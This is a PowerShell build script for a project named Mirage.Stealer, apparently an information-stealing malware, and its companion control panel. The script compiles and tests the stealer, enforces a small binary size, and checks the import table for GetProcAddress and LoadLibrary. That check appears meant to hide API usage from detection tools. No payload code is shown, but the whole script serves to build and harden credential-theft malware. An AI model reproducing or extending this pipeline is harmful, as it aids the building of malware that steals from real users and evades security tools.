# Build Stealer
Write-Host "=== Building Mirage.Stealer ===" -ForegroundColor Cyan
cd "D:\Development\projects\Malware\stealers\Mirage\Mirage.Stealer"
zig build 2>&1
if ($LASTEXITCODE -ne 0) { Write-Host "FAILED" -ForegroundColor Red; exit 1 }

# Test Stealer
zig build test 2>&1
if ($LASTEXITCODE -ne 0) { Write-Host "TESTS FAILED" -ForegroundColor Red; exit 1 }

# Check size
$size = (Get-Item ".\zig-out\bin\Mirage.exe").Length
Write-Host "Size: $size bytes" -ForegroundColor Yellow
if ($size -gt 150KB) { Write-Host "WARNING: Binary > 150KB" -ForegroundColor Yellow }

# Build Panel
Write-Host "=== Building Mirage.Panel ===" -ForegroundColor Cyan
cd "D:\Development\projects\Malware\stealers\Mirage\Mirage.Panel"
dotnet build 2>&1 | Out-Null
if ($LASTEXITCODE -ne 0) { Write-Host "PANEL BUILD FAILED" -ForegroundColor Red; exit 1 }

# IAT verification (check for GetProcAddress in imports)
Write-Host "=== IAT Verification ===" -ForegroundColor Cyan
$iat = dumpbin /imports "D:\Development\projects\Malware\stealers\Mirage\Mirage.Stealer\zig-out\bin\Mirage.exe" 2>&1
if ($iat -match "GetProcAddress") { Write-Host "WARNING: GetProcAddress in IAT" -ForegroundColor Yellow }
if ($iat -match "LoadLibrary") { Write-Host "WARNING: LoadLibrary in IAT" -ForegroundColor Yellow }

Write-Host "=== ALL CHECKS PASSED ===" -ForegroundColor Green
